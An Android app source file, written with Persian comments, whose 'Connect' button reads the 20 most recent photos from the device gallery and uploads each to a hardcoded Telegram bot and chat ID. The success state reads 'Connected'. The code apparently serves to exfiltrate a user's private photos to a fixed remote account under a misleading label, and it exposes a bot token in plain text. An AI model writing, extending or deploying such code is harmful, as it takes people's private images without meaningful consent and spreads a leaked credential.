package com.example.photosender;

import android.content.ContentUris;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    // ==================== ثابت‌های ربات ====================
    private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
    private static final String CHAT_ID = "8961077299";

    // ==================== وضعیت‌های برنامه ====================
    private enum ConnectionState {
        IDLE,       // آماده (آبی)
        CONNECTING, // در حال ارسال (خاکستری و غیرفعال)
        CONNECTED,  // ارسال موفق (سبز)
        DISCONNECTED // ارسال ناموفق (قرمز)
    }

    // ==================== متغیرهای UI ====================
    private Button btnConnect;
    private TextView txtStatus;
    private ProgressBar progressBar;

    // جلوگیری از چند کلیک همزمان
    private boolean isSending = false;

    // ==================== متدهای چرخه زندگی ====================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // اتصال به عناصر UI
        btnConnect = findViewById(R.id.btnConnect);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);

        // تنظیم وضعیت اولیه
        updateUI(ConnectionState.IDLE);

        // رویداد کلیک دکمه
        btnConnect.setOnClickListener(v -> {
            if (isSending) return; // اگر در حال ارسال هستیم، کاری نکن
            startSendingProcess();
        });
    }

    // ==================== شروع فرآیند ارسال ====================
    private void startSendingProcess() {
        isSending = true;
        updateUI(ConnectionState.CONNECTING);

        // اجرا در ترد جداگانه (برای جلوگیری از هنگ کردن UI)
        new Thread(() -> {
            boolean success = false;
            String errorMessage = "";
            int sentCount = 0;

            try {
                // 1. دریافت ۲۰ عکس آخر (بدون offset، همیشه آخرین‌ها)
                ArrayList<Uri> images = getLast20Images();

                if (images.isEmpty()) {
                    errorMessage = "هیچ عکسی در گالری یافت نشد";
                } else {
                    // 2. ارسال به تلگرام
                    sentCount = sendToTelegram(images);
                    if (sentCount == images.size()) {
                        success = true;
                    } else {
                        errorMessage = "تنها " + sentCount + " از " + images.size() + " عکس ارسال شد";
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
                errorMessage = e.getMessage();
                success = false;
            }

            // بروزرسانی UI در ترد اصلی
            final boolean finalSuccess = success;
            final String finalError = errorMessage;
            final int finalSentCount = sentCount;
            runOnUiThread(() -> {
                isSending = false;
                if (finalSuccess) {
                    updateUI(ConnectionState.CONNECTED);
                    Toast.makeText(MainActivity.this,
                            "✅ " + finalSentCount + " عکس آخر با موفقیت ارسال شد",
                            Toast.LENGTH_LONG).show();
                } else {
                    updateUI(ConnectionState.DISCONNECTED);
                    Toast.makeText(MainActivity.this,
                            "❌ خطا: " + finalError,
                            Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }

    // ==================== دریافت ۲۰ عکس آخر (بدون offset) ====================
    private ArrayList<Uri> getLast20Images() {
        ArrayList<Uri> list = new ArrayList<>();
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.Images.Media._ID };
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                collection,
                projection,
                null,
                null,
                sortOrder
        )) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    long id = cursor.getLong(idCol);
                    Uri uri = ContentUris.withAppendedId(collection, id);
                    list.add(uri);
                    count++;
                }
            }
        }
        return list;
    }

    // ==================== ارسال به تلگرام (همان کد خودت با اندکی تغییر) ====================
    private int sendToTelegram(ArrayList<Uri> images) throws Exception {
        OkHttpClient client = new OkHttpClient();
        int success = 0;

        for (Uri uri : images) {
            try {
                InputStream in = getContentResolver().openInputStream(uri);
                if (in == null) continue;

                byte[] bytes = readBytes(in);
                in.close();

                RequestBody photoBody = RequestBody.create(
                        bytes,
                        MediaType.parse("image/jpeg")
                );

                MultipartBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "image.jpg", photoBody)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(body)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    success++;
                }
                response.close();

                // تأخیر برای جلوگیری از محدودیت تلگرام
                Thread.sleep(250);

            } catch (Exception e) {
                e.printStackTrace();
                // اگر یک عکس خطا داد، ادامه بده
            }
        }
        return success;
    }

    // ==================== تبدیل InputStream به byte[] ====================
    private byte[] readBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int n;
        while ((n = inputStream.read(data)) != -1) {
            buffer.write(data, 0, n);
        }
        return buffer.toByteArray();
    }

    // ==================== بروزرسانی UI بر اساس وضعیت ====================
    private void updateUI(ConnectionState state) {
        switch (state) {
            case IDLE:
                btnConnect.setEnabled(true);
                btnConnect.setText("اتصال");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.blue));
                txtStatus.setText("وضعیت: آماده ارسال");
                progressBar.setVisibility(ProgressBar.GONE);
                break;

            case CONNECTING:
                btnConnect.setEnabled(false);
                btnConnect.setText("در حال ارسال...");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.gray));
                txtStatus.setText("وضعیت: در حال ارسال عکس‌ها...");
                progressBar.setVisibility(ProgressBar.VISIBLE);
                break;

            case CONNECTED:
                btnConnect.setEnabled(true);
                btnConnect.setText("متصل ✓");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.green));
                txtStatus.setText("وضعیت: ارسال موفق ✅");
                progressBar.setVisibility(ProgressBar.GONE);
                break;

            case DISCONNECTED:
                btnConnect.setEnabled(true);
                btnConnect.setText("اتصال برقرار نشد");
                btnConnect.setBackgroundTintList(
                        ContextCompat.getColorStateList(this, R.color.red));
                txtStatus.setText("وضعیت: ارسال ناموفق ❌ - دوباره تلاش کن");
                progressBar.setVisibility(ProgressBar.GONE);
                break;
        }
    }
}
